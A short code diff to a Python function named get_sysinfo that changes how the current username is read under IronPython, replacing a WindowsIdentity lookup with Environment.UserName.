@@ -18,7 +18,7 @@ def get_sysinfo(nonce='00000000'):
 
     try:
         if platform.python_implementation() == 'IronPython':
-            username =  WindowsIdentity.GetCurrent().User.ToString()
+            username =  Environment.UserName
         else:
             username = pwd.getpwuid(os.getuid())[0].strip("\\")
     except Exception as e:
